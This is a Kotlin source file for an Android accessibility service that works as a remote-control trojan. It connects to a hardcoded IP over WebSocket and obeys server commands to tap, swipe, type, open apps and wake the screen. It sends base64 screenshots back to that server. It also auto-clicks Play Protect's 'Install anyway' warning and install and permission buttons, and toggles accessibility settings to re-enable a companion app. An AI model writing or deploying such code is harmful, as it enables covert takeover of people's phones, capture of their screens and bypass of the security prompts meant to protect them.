package com.example.controller_helper

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.util.Log
import android.content.Intent
import android.provider.Settings
import android.os.Handler
import android.os.Looper
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import java.net.URI
import org.json.JSONObject
import android.os.PowerManager
import android.content.Context
import android.os.Build
import android.graphics.Path
import android.accessibilityservice.GestureDescription

class HelperAccessibilityService : AccessibilityService() {

    private enum class AutoState {
        IDLE,
        LOOKING_FOR_APP_IN_LIST,
        LOOKING_FOR_SWITCH_OFF,
        CONFIRM_OFF,
        LOOKING_FOR_SWITCH_ON,
        CONFIRM_ON
    }

    private var currentState = AutoState.IDLE
    private var webSocketClient: WebSocketClient? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "Helper Accessibility Service Connected")
        connectWebSocket()
    }

    override fun onDestroy() {
        try {
            webSocketClient?.close()
        } catch(e: Exception) {}
        super.onDestroy()
    }

    private fun connectWebSocket() {
        try {
            val uri = URI("ws://95.46.161.3:10555/ws")
            webSocketClient = object : WebSocketClient(uri) {
                override fun onOpen(handshakedata: ServerHandshake?) {
                    Log.i(TAG, "WebSocket Opened")
                    val metrics = resources.displayMetrics
                    val width = metrics.widthPixels
                    val height = metrics.heightPixels
                    val ident = JSONObject().apply {
                        put("type", "device_size")
                        put("width", width)
                        put("height", height)
                        put("version", "helper-1.0.0")
                        put("is_helper", true)
                    }
                    send(ident.toString())
                    Log.i(TAG, "Identity sent to server")
                }

                override fun onMessage(message: String?) {
                    Log.i(TAG, "WebSocket Message: $message")
                    if (message != null) {
                        try {
                            val action = JSONObject(message)
                            executeAction(action)
                        } catch (e: Exception) {
                            Log.e(TAG, "Error parsing message", e)
                        }
                    }
                }

                override fun onClose(code: Int, reason: String?, remote: Boolean) {
                    Log.i(TAG, "WebSocket Closed: $reason. Reconnecting...")
                    reconnectLater()
                }

                override fun onError(ex: Exception?) {
                    Log.e(TAG, "WebSocket Error", ex)
                    reconnectLater()
                }
            }
            webSocketClient?.connect()
        } catch (e: Exception) {
            Log.e(TAG, "Connect failed", e)
            reconnectLater()
        }
    }

    private fun reconnectLater() {
        Handler(Looper.getMainLooper()).postDelayed({
            if (webSocketClient == null || webSocketClient?.isOpen == false) {
                Log.i(TAG, "Attempting reconnect...")
                connectWebSocket()
            }
        }, 5000)
    }

    private fun executeAction(action: JSONObject) {
        val type = action.optString("action", "")
        Log.d(TAG, "executeAction: $type")
        val handler = Handler(Looper.getMainLooper())
        
        handler.post {
            try {
                when (type) {
                    "back" -> performGlobalAction(GLOBAL_ACTION_BACK)
                    "home" -> performGlobalAction(GLOBAL_ACTION_HOME)
                    "recents" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
                    "wakeup" -> wakeUp()
                    "tap" -> {
                        val x = action.optDouble("x", 0.0).toFloat()
                        val y = action.optDouble("y", 0.0).toFloat()
                        performTap(x, y)
                    }
                    "swipe" -> {
                        val x1 = action.optDouble("x", 0.0).toFloat()
                        val y1 = action.optDouble("y", 0.0).toFloat()
                        val x2 = action.optDouble("x2", 0.0).toFloat()
                        val y2 = action.optDouble("y2", 0.0).toFloat()
                        val duration = action.optLong("duration", 300)
                        performSwipe(x1, y1, x2, y2, duration)
                    }
                    "click" -> {
                        val label = action.optString("label", "")
                        clickByLabel(label)
                    }
                    "open" -> {
                        val appName = action.optString("text", "")
                        launchApp(appName)
                    }
                    "write" -> {
                        val text = action.optString("text", "")
                        inputText(text)
                    }
                    "screenshot" -> {
                        takeScreenshotCompat()
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Execute action failed", e)
            }
        }
    }

    fun performTap(x: Float, y: Float) {
        Log.d(TAG, "performTap: dispatching gesture at ($x, $y)")
        val path = Path().also { it.moveTo(x, y) }
        val stroke = GestureDescription.StrokeDescription(path, 0, 100)
        dispatchGesture(
            GestureDescription.Builder().addStroke(stroke).build(),
            null, null
        )
    }

    fun performSwipe(x1: Float, y1: Float, x2: Float, y2: Float, duration: Long) {
        Log.d(TAG, "performSwipe: dispatching swipe from ($x1, $y1) to ($x2, $y2) duration $duration")
        val path = Path().also {
            it.moveTo(x1, y1)
            it.lineTo(x2, y2)
        }
        val stroke = GestureDescription.StrokeDescription(path, 0, duration)
        dispatchGesture(
            GestureDescription.Builder().addStroke(stroke).build(),
            null, null
        )
    }

    fun clickByLabel(label: String): Boolean {
        val root = rootInActiveWindow ?: return false
        return try {
            findAndClick(root, label.lowercase().trim())
        } finally {
            root.recycle()
        }
    }

    private fun findAndClick(node: AccessibilityNodeInfo, label: String): Boolean {
        if (node.isVisibleToUser) {
            val text = node.text?.toString()?.lowercase() ?: ""
            val desc = node.contentDescription?.toString()?.lowercase() ?: ""
            if ((text.contains(label) || desc.contains(label)) && node.isEnabled) {
                if (node.isClickable) {
                    return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                }
            }
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val found = findAndClick(child, label)
            child.recycle()
            if (found) return true
        }
        return false
    }

    fun launchApp(appName: String): Boolean {
        val pm = packageManager
        val query = appName.lowercase().trim()
        val match = pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA)
            .filter { pm.getApplicationLabel(it).toString().lowercase().contains(query) }
            .minByOrNull {
                val label = pm.getApplicationLabel(it).toString().lowercase()
                when {
                    label == query          -> 0
                    label.startsWith(query) -> 1
                    else                    -> 2
                }
            }
        if (match != null) {
            try {
                val intent = pm.getLaunchIntentForPackage(match.packageName)
                    ?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                if (intent != null) {
                    startActivity(intent)
                    return true
                }
            } catch (e: Exception) {}
        }
        return false
    }

    fun inputText(text: String): Boolean {
        val root = rootInActiveWindow ?: return false
        return try {
            val focusedNode = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
            if (focusedNode != null && focusedNode.isEditable) {
                val arguments = android.os.Bundle()
                arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
                val success = focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
                focusedNode.recycle()
                success
            } else {
                focusedNode?.recycle()
                false
            }
        } finally {
            root.recycle()
        }
    }

    fun wakeUp(): Boolean {
        return try {
            val pm = getSystemService(Context.POWER_SERVICE) as? PowerManager
            if (pm != null && !pm.isInteractive) {
                val wakeLock = pm.newWakeLock(
                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
                            PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "ControllerHelper:WakeUp"
                )
                wakeLock.acquire(3000)
                wakeLock.release()
                Log.d(TAG, "wakeUp: Screen turned on")
                true
            } else {
                Log.d(TAG, "wakeUp: Screen was already on")
                true
            }
        } catch (e: Exception) {
            Log.e(TAG, "wakeUp failed: ${e.message}")
            false
        }
    }

    fun sendScreenshot(base64Png: String) {
        val msg = JSONObject().apply {
            put("type", "screenshot")
            put("data", base64Png)
        }
        webSocketClient?.send(msg.toString())
    }

    fun takeScreenshotCompat() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val executor = java.util.concurrent.Executors.newSingleThreadExecutor()
            takeScreenshot(
                android.view.Display.DEFAULT_DISPLAY,
                executor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(result: ScreenshotResult) {
                        try {
                            val hardwareBuffer = result.hardwareBuffer
                            val colorSpace = result.colorSpace
                            val bitmap = android.graphics.Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                            hardwareBuffer.close()
                            if (bitmap != null) {
                                val softBitmap = bitmap.copy(android.graphics.Bitmap.Config.ARGB_8888, false)
                                bitmap.recycle()
                                val stream = java.io.ByteArrayOutputStream()
                                softBitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 90, stream)
                                softBitmap.recycle()
                                val bytes = stream.toByteArray()
                                val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
                                sendScreenshot(b64)
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "Screenshot compress failed: ${e.message}")
                        }
                    }
                    override fun onFailure(errorCode: Int) {
                        Log.e(TAG, "Screenshot failed: $errorCode")
                    }
                }
            )
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val packageName = event.packageName?.toString() ?: ""

        // 1. Handle package installer events (auto-clicker)
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (packageName.contains("packageinstaller", ignoreCase = true) ||
                packageName.contains("systemui", ignoreCase = true) ||
                packageName.equals("android", ignoreCase = true)) {
                val rootNode = rootInActiveWindow
                if (rootNode != null) {
                    try {
                        autoClickInstallOrOpen(rootNode)
                    } finally {
                        rootNode.recycle()
                    }
                }
            }
        }

        // 2. Handle Accessibility settings page automation
        if (currentState != AutoState.IDLE && packageName.contains("settings", ignoreCase = true)) {
            val rootNode = rootInActiveWindow
            if (rootNode != null) {
                try {
                    runToggleStateAutomation(rootNode)
                } finally {
                    rootNode.recycle()
                }
            }
        }
    }

    private fun autoClickInstallOrOpen(node: AccessibilityNodeInfo) {
        val text = node.text?.toString()?.lowercase()?.trim() ?: ""
        val resourceId = node.viewIdResourceName ?: ""

        // 1. Play Protect: Click "More details" if visible to expand
        if (text.contains("more details") || text.contains("details")) {
            Log.d(TAG, "Play Protect warning: Clicking more details")
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        }

        // 2. Play Protect: Click "Install anyway" / "Anyway"
        if (text.contains("install anyway") || text.contains("anyway")) {
            Log.d(TAG, "Play Protect warning: Clicking install anyway")
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            return
        }

        // 3. Package Installer & Permission dialog buttons (Install, Update, Open, Done, Start now, Allow)
        if (node.isClickable) {
            val isTargetButton = text == "install" || text == "update" || text == "open" || text == "done" || 
                    text == "start now" || text == "start" || text == "allow" ||
                    text.contains("install") || text.contains("update") || text.contains("open") || text.contains("start now") ||
                    resourceId.endsWith("ok_button") || resourceId.endsWith("button1") || resourceId.endsWith("launch_button")

            if (isTargetButton) {
                Log.d(TAG, "Auto-clicking installer button: text=$text, id=$resourceId")
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)

                // If update completed (Open/Done is clicked), trigger the accessibility toggle state machine
                if (text == "open" || text == "done") {
                    Log.d(TAG, "Installation finished. Scheduling accessibility toggle in 3 seconds.")
                    Handler(Looper.getMainLooper()).postDelayed({
                        startToggleSequence()
                    }, 3000)
                }
                return
            }
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            autoClickInstallOrOpen(child)
            child.recycle()
        }
    }

    private fun startToggleSequence() {
        Log.d(TAG, "Starting Accessibility Toggle Sequence for controller_phone")
        currentState = AutoState.LOOKING_FOR_APP_IN_LIST
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
    }

    private fun runToggleStateAutomation(node: AccessibilityNodeInfo) {
        when (currentState) {
            AutoState.LOOKING_FOR_APP_IN_LIST -> {
                // Look for "controller_phone", "downloaded apps", or "installed services"
                if (findAndClickText(node, "controller_phone")) {
                    Log.d(TAG, "Found and clicked controller_phone")
                    currentState = AutoState.LOOKING_FOR_SWITCH_OFF
                    return
                }
                if (findAndClickText(node, "downloaded apps") || 
                    findAndClickText(node, "installed services") || 
                    findAndClickText(node, "downloaded services")) {
                    Log.d(TAG, "Found and clicked downloaded apps/installed services subcategory")
                    return
                }
            }
            AutoState.LOOKING_FOR_SWITCH_OFF -> {
                val switchNode = findSwitchNode(node)
                val isChecked = switchNode?.isChecked ?: true
                switchNode?.recycle()
                
                if (isChecked) {
                    Log.d(TAG, "Switch is ON, clicking to turn OFF")
                    if (findAndClickSwitch(node)) {
                        currentState = AutoState.CONFIRM_OFF
                    }
                } else {
                    Log.d(TAG, "Switch is already OFF, clicking to turn ON")
                    if (findAndClickSwitch(node)) {
                        currentState = AutoState.CONFIRM_ON
                    }
                }
            }
            AutoState.CONFIRM_OFF -> {
                val switchNode = findSwitchNode(node)
                val isChecked = switchNode?.isChecked ?: true
                switchNode?.recycle()
                
                if (!isChecked) {
                    Log.d(TAG, "Confirm stop completed (switch is OFF). Transitioning to LOOKING_FOR_SWITCH_ON.")
                    currentState = AutoState.LOOKING_FOR_SWITCH_ON
                    if (findAndClickSwitch(node)) {
                        currentState = AutoState.CONFIRM_ON
                    }
                    return
                }
                
                if (clickDialogButton(node, listOf("stop", "ok", "turn off", "deactivate"))) {
                    Log.d(TAG, "Clicked confirm stop button")
                    currentState = AutoState.LOOKING_FOR_SWITCH_ON
                }
            }
            AutoState.LOOKING_FOR_SWITCH_ON -> {
                val switchNode = findSwitchNode(node)
                val isChecked = switchNode?.isChecked ?: false
                switchNode?.recycle()
                
                if (!isChecked) {
                    Log.d(TAG, "Switch is OFF, clicking to turn ON")
                    if (findAndClickSwitch(node)) {
                        currentState = AutoState.CONFIRM_ON
                    }
                } else {
                    Log.d(TAG, "Switch is already ON, toggling complete!")
                    currentState = AutoState.IDLE
                    Handler(Looper.getMainLooper()).postDelayed({
                        launchControllerPhone()
                    }, 1000)
                }
            }
            AutoState.CONFIRM_ON -> {
                val switchNode = findSwitchNode(node)
                val isChecked = switchNode?.isChecked ?: false
                switchNode?.recycle()
                
                if (isChecked) {
                    Log.d(TAG, "Confirm start completed (switch is ON). Finishing.")
                    currentState = AutoState.IDLE
                    Handler(Looper.getMainLooper()).postDelayed({
                        launchControllerPhone()
                    }, 1000)
                    return
                }
                
                if (clickDialogButton(node, listOf("allow", "ok", "turn on", "activate", "start"))) {
                    Log.d(TAG, "Clicked confirm allow button")
                    currentState = AutoState.IDLE
                    Handler(Looper.getMainLooper()).postDelayed({
                        launchControllerPhone()
                    }, 1000)
                }
            }
            else -> {}
        }
    }

    private fun findAndClickText(node: AccessibilityNodeInfo, target: String): Boolean {
        val text = node.text?.toString()?.lowercase()?.trim() ?: ""
        if (text == target.lowercase() || text.contains(target.lowercase())) {
            var clickable = node
            while (clickable != null && !clickable.isClickable) {
                val parent = clickable.parent
                if (parent == null) break
                clickable = parent
            }
            if (clickable?.isClickable == true) {
                return clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val clicked = findAndClickText(child, target)
            child.recycle()
            if (clicked) return true
        }
        return false
    }

    private fun findSwitchNode(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val className = node.className?.toString() ?: ""
        if (className.contains("Switch", ignoreCase = true) || 
            className.contains("ToggleButton", ignoreCase = true) ||
            className.contains("CheckBox", ignoreCase = true)) {
            return AccessibilityNodeInfo.obtain(node)
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val res = findSwitchNode(child)
            child.recycle()
            if (res != null) return res
        }
        return null
    }

    private fun findAndClickSwitch(node: AccessibilityNodeInfo): Boolean {
        val className = node.className?.toString() ?: ""
        val text = node.text?.toString()?.lowercase()?.trim() ?: ""
        
        val isSwitch = className.contains("Switch", ignoreCase = true) || 
                className.contains("CompoundButton", ignoreCase = true) ||
                className.contains("ToggleButton", ignoreCase = true) ||
                className.contains("CheckBox", ignoreCase = true)
                
        val isUseText = text.contains("use ") || text.contains("controller_phone") || text.contains("service")
        
        if ((isSwitch || isUseText) && node.isEnabled) {
            // Find clickable target: either the node itself or its clickable parent
            var target: AccessibilityNodeInfo? = node
            while (target != null && !target.isClickable) {
                target = target.parent
            }
            if (target != null && target.isClickable) {
                Log.d(TAG, "Clicking target for switch/text: text=$text, class=$className")
                val success = target.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                if (target != node) target.recycle()
                if (success) return true
            }
            
            // Fallback: Click directly
            if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                Log.d(TAG, "Clicked node directly: text=$text, class=$className")
                return true
            }
        }
        
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val clicked = findAndClickSwitch(child)
            child.recycle()
            if (clicked) return true
        }
        return false
    }

    private fun clickDialogButton(node: AccessibilityNodeInfo, targets: List<String>): Boolean {
        val text = node.text?.toString()?.lowercase()?.trim() ?: ""
        val resourceId = node.viewIdResourceName ?: ""

        if (node.isClickable) {
            val isTarget = targets.any { text == it || text.contains(it) } || resourceId.endsWith("button1")
            if (isTarget) {
                return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val clicked = clickDialogButton(child, targets)
            child.recycle()
            if (clicked) return true
        }
        return false
    }

    private fun launchControllerPhone() {
        try {
            val launchIntent = packageManager.getLaunchIntentForPackage("com.example.controller_phone")
            if (launchIntent != null) {
                Log.d(TAG, "Launching controller_phone application...")
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(launchIntent)
            } else {
                Log.w(TAG, "Could not find launch intent for com.example.controller_phone. Going home instead.")
                performGlobalAction(GLOBAL_ACTION_HOME)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to launch controller_phone: ${e.message}")
            performGlobalAction(GLOBAL_ACTION_HOME)
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Helper Accessibility Service Interrupted")
    }

    companion object {
        private const val TAG = "HelperAccessibility"
    }
}
